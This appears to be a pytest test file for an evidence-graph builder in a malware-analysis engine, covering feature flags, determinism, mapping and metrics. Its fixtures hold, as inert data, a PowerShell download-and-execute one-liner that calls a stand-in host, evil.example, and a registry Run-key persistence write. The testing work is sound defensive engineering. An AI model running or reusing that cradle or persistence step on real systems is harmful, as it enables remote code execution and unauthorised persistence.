"""Phase 11.0 — Side-car builder integration tests.

Verifies:
* Builder is a pure function of ExecGraph → EvidenceGraph.
* Feature flag `NIVX_EVIDENCE_GRAPH` gates activation (default off).
* Zero mutation of the source ExecGraph.
* Deterministic output: identical ExecGraph → identical EvidenceGraph JSON.
* Well-formed integrity across representative ExecGraph shapes.
"""
from __future__ import annotations

import os

import pytest

from engine.evidence_graph import (
    EvidenceEdgeKind,
    EvidenceGraph,
    EvidenceNodeKind,
)
from engine.evidence_graph_builder import build_evidence_graph_sidecar
from engine.evidence_graph_config import (
    evidence_graph_metrics_enabled,
    evidence_graph_mode,
)
from engine.exec_graph import (
    ExecGraph,
    ExecNode,
    NodeKind,
    SideEffect,
    SideEffectVerb,
)


# ---------------------------------------------------------------------------
# Fixture ExecGraphs — small, hand-crafted, representative.
# ---------------------------------------------------------------------------
def _powershell_download_graph() -> ExecGraph:
    """PowerShell script → HTTP download → file write."""
    script = ExecNode(
        kind=NodeKind.script,
        reconstructed="IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')",
        args={},
    )
    proc = ExecNode(
        kind=NodeKind.process,
        args={"image": "powershell.exe", "command": "IEX ..."},
        inputs=(script.id,),
    )
    http = ExecNode(
        kind=NodeKind.http,
        args={"url": "http://evil.example/x.ps1", "host": "evil.example"},
        inputs=(proc.id,),
        side_effects=(
            SideEffect(verb=SideEffectVerb.download, node_id="__self__", evidence="download x.ps1"),
        ),
    )
    file_node = ExecNode(
        kind=NodeKind.file,
        args={"path": "C:/temp/x.ps1"},
        inputs=(http.id,),
    )
    # Rewire the download side-effect to point at the http node itself
    # (we use the sentinel above only to satisfy the constructor).
    http = http.model_copy(update={
        "side_effects": (
            SideEffect(verb=SideEffectVerb.download, node_id=http.id, evidence="download x.ps1"),
        ),
    })
    return (
        ExecGraph()
        .add_node(script)
        .add_node(proc)
        .add_node(http)
        .add_node(file_node)
    )


def _registry_persistence_graph() -> ExecGraph:
    proc = ExecNode(kind=NodeKind.process, args={"image": "reg.exe"})
    reg = ExecNode(
        kind=NodeKind.registry,
        args={"key": "HKCU/Software/Microsoft/Windows/CurrentVersion/Run/x"},
        inputs=(proc.id,),
    )
    reg = reg.model_copy(update={
        "side_effects": (
            SideEffect(verb=SideEffectVerb.write_registry, node_id=reg.id),
        ),
    })
    return ExecGraph().add_node(proc).add_node(reg)


def _empty_graph() -> ExecGraph:
    return ExecGraph()


# ---------------------------------------------------------------------------
# Feature-flag gating
# ---------------------------------------------------------------------------
class TestFeatureFlag:
    def test_default_mode_is_off(self, monkeypatch):
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH", raising=False)
        assert evidence_graph_mode() == "off"

    def test_sidecar_mode(self, monkeypatch):
        monkeypatch.setenv("NIVX_EVIDENCE_GRAPH", "sidecar")
        assert evidence_graph_mode() == "sidecar"

    def test_unknown_value_treated_as_off(self, monkeypatch):
        monkeypatch.setenv("NIVX_EVIDENCE_GRAPH", "garbage")
        assert evidence_graph_mode() == "off"

    def test_builder_short_circuits_when_off(self, monkeypatch):
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH", raising=False)
        g, m = build_evidence_graph_sidecar(_powershell_download_graph())
        assert g is None
        assert m is None

    def test_builder_runs_when_forced(self, monkeypatch):
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH", raising=False)
        g, m = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert g is not None
        assert m is not None

    def test_builder_runs_when_sidecar(self, monkeypatch):
        monkeypatch.setenv("NIVX_EVIDENCE_GRAPH", "sidecar")
        g, m = build_evidence_graph_sidecar(_powershell_download_graph())
        assert g is not None

    def test_metrics_flag(self, monkeypatch):
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH_METRICS", raising=False)
        assert evidence_graph_metrics_enabled() is False
        monkeypatch.setenv("NIVX_EVIDENCE_GRAPH_METRICS", "on")
        assert evidence_graph_metrics_enabled() is True


# ---------------------------------------------------------------------------
# Determinism & purity
# ---------------------------------------------------------------------------
class TestDeterminism:
    def test_identical_input_identical_output(self):
        # Determinism is a property of the *same* input ExecGraph — not two
        # independently-constructed ones (ExecNode.id is a random UUID).
        eg = _powershell_download_graph()
        g1, _ = build_evidence_graph_sidecar(eg, force=True)
        g2, _ = build_evidence_graph_sidecar(eg, force=True)
        assert g1 is not None and g2 is not None
        assert g1.to_json() == g2.to_json()

    def test_content_addressed_ids_survive_execnode_id_reshuffle(self):
        # Node IDs in the EvidenceGraph must depend only on the entities,
        # not on the ExecNode UUIDs used to observe them.
        g1, _ = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        g2, _ = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert g1 is not None and g2 is not None
        assert {n.id for n in g1.nodes} == {n.id for n in g2.nodes}
        assert {e.id for e in g1.edges} == {e.id for e in g2.edges}

    def test_builder_does_not_mutate_exec_graph(self):
        eg = _powershell_download_graph()
        before = eg.model_dump(mode="json")
        build_evidence_graph_sidecar(eg, force=True)
        after = eg.model_dump(mode="json")
        assert before == after

    def test_empty_exec_graph_produces_root_only(self):
        g, _ = build_evidence_graph_sidecar(_empty_graph(), force=True)
        assert g is not None
        # Only the synthetic root process.
        assert len(g.nodes) == 1
        assert g.nodes[0].kind == EvidenceNodeKind.process
        assert g.edges == ()


# ---------------------------------------------------------------------------
# Mapping correctness (Phase 11.0 subset only)
# ---------------------------------------------------------------------------
class TestMapping:
    def test_powershell_download_produces_expected_entities(self):
        g, _ = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert g is not None
        kinds = {n.kind for n in g.nodes}
        assert EvidenceNodeKind.script in kinds
        assert EvidenceNodeKind.process in kinds
        assert EvidenceNodeKind.url in kinds
        assert EvidenceNodeKind.file in kinds

    def test_download_side_effect_emits_downloads_edge(self):
        g, _ = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert g is not None
        assert len(g.edges_by_kind(EvidenceEdgeKind.downloads)) >= 1

    def test_registry_persistence_produces_writes_edge(self):
        g, _ = build_evidence_graph_sidecar(_registry_persistence_graph(), force=True)
        assert g is not None
        assert len(g.edges_by_kind(EvidenceEdgeKind.writes)) >= 1
        assert EvidenceNodeKind.registry in {n.kind for n in g.nodes}

    def test_derivation_edges_created_for_parent_child(self):
        g, _ = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert g is not None
        assert len(g.edges_by_kind(EvidenceEdgeKind.derived_from)) >= 1


# ---------------------------------------------------------------------------
# Integrity (side-car must always produce a well-formed graph)
# ---------------------------------------------------------------------------
class TestIntegrityOnRealShapes:
    @pytest.mark.parametrize("factory", [
        _empty_graph,
        _powershell_download_graph,
        _registry_persistence_graph,
    ])
    def test_side_car_graph_is_well_formed(self, factory):
        g, m = build_evidence_graph_sidecar(factory(), force=True)
        assert g is not None
        assert not g.has_hard_errors(), f"integrity errors: {g.validate_integrity()}"
        assert m is not None
        assert m.integrity_errors == 0


# ---------------------------------------------------------------------------
# Non-influence invariant — the graph must NOT affect verdicts.
# ---------------------------------------------------------------------------
class TestNonInfluence:
    def test_execgraph_unchanged_after_build(self):
        eg = _powershell_download_graph()
        snapshot = eg.model_dump(mode="json")
        # Repeat 3× to catch any accumulating state.
        for _ in range(3):
            build_evidence_graph_sidecar(eg, force=True)
        assert eg.model_dump(mode="json") == snapshot

    def test_builder_takes_no_writable_reference(self):
        eg = _powershell_download_graph()
        # ExecGraph is a frozen pydantic model — attempts to mutate raise.
        # This test documents the contract more than tests it.
        assert eg.model_config["frozen"] is True

    def test_no_side_effect_when_flag_off(self, monkeypatch):
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH", raising=False)
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH_METRICS", raising=False)
        eg = _powershell_download_graph()
        g, m = build_evidence_graph_sidecar(eg)
        assert g is None and m is None


# ---------------------------------------------------------------------------
# Metrics
# ---------------------------------------------------------------------------
class TestMetrics:
    def test_metrics_populated(self):
        g, m = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert g is not None and m is not None
        assert m.node_count == len(g.nodes)
        assert m.edge_count == len(g.edges)
        assert m.build_ms >= 0.0
        assert m.peak_memory_kb >= 0.0
        assert m.integrity_errors == 0
        assert m.evidence_graph_schema_version == g.schema_version

    def test_metrics_within_performance_envelope(self):
        # Phase 11.0 quality gate: for small ExecGraphs the side-car
        # must build in well under 50ms and under ~1MB peak.
        g, m = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert m is not None
        assert m.build_ms < 50.0
        assert m.peak_memory_kb < 1024.0

    def test_metrics_dict_serializable(self):
        _, m = build_evidence_graph_sidecar(_powershell_download_graph(), force=True)
        assert m is not None
        d = m.to_dict()
        assert set(d.keys()) == {
            "node_count", "edge_count", "build_ms", "peak_memory_kb",
            "integrity_errors", "exec_graph_schema_version",
            "evidence_graph_schema_version",
        }
